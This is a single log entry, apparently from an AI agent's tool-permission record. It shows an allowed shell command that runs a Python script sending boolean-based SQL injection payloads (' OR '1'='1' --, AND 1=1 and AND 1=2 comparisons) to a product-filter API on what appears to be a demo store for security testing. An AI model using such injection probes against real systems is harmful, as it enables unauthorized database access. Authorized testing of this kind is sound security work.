{"ts": 1790641493.7998939, "decision_id": "622cdf195eaa", "tool": "run_shell", "allow": true, "reason": null, "target": "python3 -c \"\nimport requests\n\nurl = 'https://duck-store.escape.tech/api/v1/products/filter/by-color'\n\n# Test case sensitivity\nfor c in ['yellow', 'Yellow', 'YELLOW', 'yelLow']:\n    r = requests.get(url, params={'color': c})\n    print(f'{c}: {r.status_code} len={len(r.text)} -> {r.text[:100]}')\n\n# Test the OR 1=1 more carefully\nr = requests.get(url, params={'color': \\\"' OR '1'='1' --\\\"})\nprint(\\\"\\\\nOR 1=1--:\\\", r.status_code, r.text[:200])\n\n# Test with valid prefix that returns data\nr = requests.get(url, params={'color': \\\"yellow' OR '1'='1' --\\\"})\nprint(\\\"yellow OR 1=1--:\\\", r.status_code, r.text[:200])\n\n# Test if it's really SQLi or just some filter logic\nr = requests.get(url, params={'color': \\\"yellow' AND '1'='1\\\"})\nprint(\\\"yellow AND 1=1:\\\", r.status_code, r.text[:200])\n\nr = requests.get(url, params={'color': \\\"yellow' AND '1'='2\\\"})\nprint(\\\"yellow AND 1=2:\\\", r.status_code, r.text[:200])\n\""}
